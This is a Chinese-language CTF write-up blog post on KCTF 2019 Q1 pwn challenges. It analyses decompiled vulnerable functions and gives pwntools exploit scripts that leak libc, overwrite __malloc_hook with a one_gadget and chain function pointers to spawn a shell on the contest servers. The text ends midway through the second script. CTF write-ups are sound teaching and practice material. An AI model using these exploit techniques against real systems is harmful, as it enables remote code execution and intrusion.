<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="referrer" content="no-referrer" />
    <meta name="description" content="我果然还是不太适合这种长时间作战开赛第一天周末抢了两个pwn一血，然后就没有时间做题了学校大二事情真多，第一周抽时间又做了一个repwn，简单分析了go pwn，第二周就彻底没有时间了，不过究其原因还是太菜go pwn占坑，等到完全读完go的内存分配机制再来写 1My ID: 梅零落 0x01 拯救单身狗一血，happy Analyze比较显然的两个点：两个edit函数只判断指针是否存在，没有判断">
<meta property="og:type" content="article">
<meta property="og:title" content="KCTF 2019 Q1">
<meta property="og:url" content="http://yoursite.com/2019/03/22/KCTF-2019-Q1/index.html">
<meta property="og:site_name" content="Kirin&#39;s Blog">
<meta property="og:description" content="我果然还是不太适合这种长时间作战开赛第一天周末抢了两个pwn一血，然后就没有时间做题了学校大二事情真多，第一周抽时间又做了一个repwn，简单分析了go pwn，第二周就彻底没有时间了，不过究其原因还是太菜go pwn占坑，等到完全读完go的内存分配机制再来写 1My ID: 梅零落 0x01 拯救单身狗一血，happy Analyze比较显然的两个点：两个edit函数只判断指针是否存在，没有判断">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-fec872e7b862a319.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-f23e0bf237cca078.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-8fd2cb1e46b27355.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-f58aef2538efaa46.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-4314dcfd4a163995.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="article:published_time" content="2019-03-22T11:58:52.000Z">
<meta property="article:modified_time" content="2019-03-30T12:02:48.000Z">
<meta property="article:author" content="Kirin">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="Reverse">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/7434375-fec872e7b862a319.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
    
    
        
          
              <link rel="shortcut icon" href="/images/logo.jpg">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/logo.jpg" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.jpg">
          
        
    
    <!-- title -->
    <title>KCTF 2019 Q1</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/CTF-Writeups/">CTF-Writeups</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/03/23/Teaser-CONFidence-CTF-2019-p4fmt-oldschool/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/03/12/Everything-Restart/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/03/22/KCTF-2019-Q1/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/03/22/KCTF-2019-Q1/&text=KCTF 2019 Q1" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/03/22/KCTF-2019-Q1/&title=KCTF 2019 Q1" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/03/22/KCTF-2019-Q1/&is_video=false&description=KCTF 2019 Q1" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=KCTF 2019 Q1&body=Check out this article: http://yoursite.com/2019/03/22/KCTF-2019-Q1/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/03/22/KCTF-2019-Q1/&title=KCTF 2019 Q1" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/03/22/KCTF-2019-Q1/&title=KCTF 2019 Q1" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/03/22/KCTF-2019-Q1/&title=KCTF 2019 Q1" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/03/22/KCTF-2019-Q1/&title=KCTF 2019 Q1" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/03/22/KCTF-2019-Q1/&name=KCTF 2019 Q1&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-拯救单身狗"><span class="toc-number">1.</span> <span class="toc-text">0x01 拯救单身狗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">1.1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-C与C"><span class="toc-number">2.</span> <span class="toc-text">0x02 C与C++</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-1"><span class="toc-number">2.1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Repwn"><span class="toc-number">3.</span> <span class="toc-text">0x03 Repwn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-挖宝"><span class="toc-number">4.</span> <span class="toc-text">0x04 挖宝</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        KCTF 2019 Q1
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Kirin's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2019-03-22T11:58:52.000Z" itemprop="datePublished">2019-03-22</time>
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/PWN/" rel="tag">PWN</a>, <a class="tag-link" href="/tags/Reverse/" rel="tag">Reverse</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>我果然还是不太适合这种长时间作战<br>开赛第一天周末抢了两个pwn一血，然后就没有时间做题了<br>学校大二事情真多，第一周抽时间又做了一个repwn，简单分析了go pwn，第二周就彻底没有时间了，不过究其原因还是太菜<br>go pwn占坑，等到完全读完go的内存分配机制再来写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My ID: 梅零落</span><br></pre></td></tr></table></figure>
<h2 id="0x01-拯救单身狗"><a href="#0x01-拯救单身狗" class="headerlink" title="0x01 拯救单身狗"></a>0x01 拯救单身狗</h2><p>一血，happy</p>
<h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><p>比较显然的两个点：<br>两个edit函数只判断指针是否存在，没有判断输入的int范围：<br>（为了符合理解，我把one和two rename交换了一下）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit_singledog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"which?"</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( one[v1] )                                <span class="comment">// 数组溢出</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Oh,singledog,changing your name can bring you good luck."</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)one[v1], <span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"new name: %s"</span>, one[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"nothing here"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit_luckydog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"which?"</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( two[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Oh,luckydog,What is your new name?"</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)(two[v1] + <span class="number">8L</span>L), <span class="number">0x18</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"your partner's new name"</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, *(<span class="keyword">void</span> **)two[v1], <span class="number">0x20</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"nothing here"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>edit_singledog()不存在\x00截断，导致很容易leak</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"Oh,singledog,changing your name can bring you good luck."</span>);</span><br><span class="line"> <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)one[v1], <span class="number">0x20</span>uLL);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"new name: %s"</span>, one[v1]);</span><br></pre></td></tr></table></figure>

<p>注意到标准错误stderr在两个数组上方，可以通过leak IO_FILE的 _IO_read_ptr来leak libc<br>因为two的结构体：struct{str *partner name;  str own name;}<br>而后只需要在one中构造一个singledog的name为p64(malloc_hook_addr)<br>在 edit_luckydog() 时就可以利用数组溢出，在edit partner name时即会改写malloc_hook<br>将其改为one_gadget_addr，在再次create一次便可get shell<br>还有一点，这里libc版本未知，我是通过首先远程leak出一个 _IO_read_ptr ，而后改变本地libc版本，找到相同末位偏移的libc版本(2.27)</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create1</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt;\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"Name:\n"</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create2</span><span class="params">(name1,name2)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt;\n"</span>,<span class="string">"2"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"Name\n"</span>,name1)</span><br><span class="line">    p.sendafter(<span class="string">"name\n"</span>,name2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit1</span><span class="params">(index,name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt;\n"</span>,<span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"?\n"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">"luck.\n"</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit2</span><span class="params">(index,name1,name2)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt;\n"</span>,<span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"?\n"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">"?\n"</span>,name1)</span><br><span class="line">    p.sendafter(<span class="string">"name\n"</span>,name2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fake</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt;\n"</span>,<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process("./apwn")</span></span><br><span class="line">p=remote(<span class="string">"211.159.175.39"</span>,<span class="number">8686</span>)</span><br><span class="line">create1(<span class="string">"kirin"</span>)</span><br><span class="line">create1(<span class="string">"kirin"</span>)</span><br><span class="line">create2(<span class="string">"kirin"</span>,<span class="string">"kirin"</span>)</span><br><span class="line">create2(<span class="string">"kirin"</span>,<span class="string">"kirin"</span>)</span><br><span class="line">fake()</span><br><span class="line">fake()</span><br><span class="line">create1(<span class="string">"1"</span>)</span><br><span class="line">edit1(<span class="number">0</span>,<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"new name: "</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="number">-0x31</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line">edit1(<span class="number">-4</span>,<span class="string">"11111111"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"11111111"</span>)</span><br><span class="line">libc_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="number">-0x3ec703</span></span><br><span class="line">one_gadget=libc_addr+<span class="number">0x10a38c</span></span><br><span class="line">malloc_hook=libc_addr+<span class="number">0x3ebc30</span></span><br><span class="line">create1(p64(malloc_hook))</span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line">edit2(<span class="number">-79</span>,<span class="string">"kirin"</span>,p64(one_gadget))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x02-C与C"><a href="#0x02-C与C" class="headerlink" title="0x02 C与C++"></a>0x02 C与C++</h2><p>一血，again</p>
<h3 id="Analyze-1"><a href="#Analyze-1" class="headerlink" title="Analyze"></a>Analyze</h3><p>这里提供了两种malloc和free方式<br>两种分配方式都会每16字节进行一次存储，每一块包含function_ptr(析构)+16bytes string(c对应的func设为0，c++为&amp;400F20)<br>不同点：<br>c++对应的分配会在chunk起始写入字节被分割的数目，但c不会:<br><img src="https://upload-images.jianshu.io/upload_images/7434375-fec872e7b862a319.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="c"><br><img src="https://upload-images.jianshu.io/upload_images/7434375-f23e0bf237cca078.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="c++"></p>
<p>正是这种偏差，当我们用c方式malloc一个chunk，但是用c++进行free时<br>在c++对应的free：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">delete_func</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> (***v1)(); <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">void</span> (***v2)(); <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> (*v3)(); <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = (<span class="keyword">void</span> (***)())ptr[a1];</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = &amp;v1[<span class="number">3</span> * (_QWORD)*(v1 - <span class="number">1</span>)];</span><br><span class="line">    <span class="keyword">while</span> ( v2 != v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v2 -= <span class="number">3</span>;</span><br><span class="line">        v3 = **v2;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == nullsub_1 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">void</span> (***)()))v3)(v2);</span><br><span class="line">        v1 = (<span class="keyword">void</span> (***)())ptr[a1];</span><br><span class="line">        <span class="keyword">if</span> ( v2 == v1 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_6:</span><br><span class="line">    <span class="keyword">operator</span> <span class="keyword">delete</span>[](v2 - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ptr[a1] = <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其会把chunk size当做分割数定位结束位置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v2 &#x3D; &amp;v1[3 * (_QWORD)*(v1 - 1)];</span><br></pre></td></tr></table></figure>
<p>但这样显然会远超过本chunk<br>所以当我们在目标位置写入一个指向其他函数的指针时（这里可以考虑在name处写入一个func addr，这样在目标地址写入name的地址，就会最终调用我们需要的function）,当调用完这个函数v2指针减三，此处我们依然可控……，由此便可生成一条调用链：<br>leak libc-&gt;main func<br>回到main函数后依然利用此漏洞来调用one_gadget<br>由此便可get shell<br>注意leak问题：<br>在输出menu时有个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1. malloc"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2. free"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3. new"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4. delete"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"5. puts"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"6. exit"</span>);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, (__int64)<span class="string">"&gt;&gt; "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v0 == <span class="number">0xDEADBEEF</span> )</span><br><span class="line">    leak();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当v0=0xDEADBEEF时调用，实际无法调用（至少没有直接方法）<br>但是进入此函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leak</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v0; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v0 = '\np%';</span><br><span class="line">  __printf_chk(<span class="number">0L</span>L, (__int64)&amp;v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现他可以leak一个地址<br>当我们写入调用链，其会输出libc中的一个地址<br>由此选择此函数进行leak</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(length,note)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"string\n"</span>,str(length))</span><br><span class="line">   p.sendafter(<span class="string">"string\n"</span>,note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"string\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process("./candcpp")</span></span><br><span class="line">p=remote(<span class="string">"154.8.222.144"</span>,<span class="number">9999</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"name: "</span>,p64(<span class="number">0x400e10</span>)+p64(<span class="number">0x4009a0</span>))</span><br><span class="line">malloc(<span class="number">8</span>,<span class="string">"kirin\n"</span>)</span><br><span class="line">fake=(p64(<span class="number">0x602330</span>)*<span class="number">2</span>)[:<span class="number">15</span>]</span><br><span class="line">malloc(<span class="number">0x1f0</span>,<span class="string">"a"</span>*<span class="number">0x1b3</span>+fake+p64(<span class="number">0x602328</span>)*<span class="number">2</span>+<span class="string">"\n"</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">libc_addr=int(p.recv(<span class="number">0xf</span>),<span class="number">16</span>)<span class="number">-0x6f690</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line">p.sendlineafter(<span class="string">"name: "</span>,p64(libc_addr+<span class="number">0xf02a4</span>))</span><br><span class="line">malloc(<span class="number">8</span>,<span class="string">"kirin\n"</span>)</span><br><span class="line">fake=(p64(<span class="number">0x602330</span>)*<span class="number">2</span>)[:<span class="number">15</span>]</span><br><span class="line">malloc(<span class="number">0x1f0</span>,<span class="string">"a"</span>*<span class="number">0x1c2</span>+p64(<span class="number">0x602328</span>)*<span class="number">2</span>+<span class="string">"\n"</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span 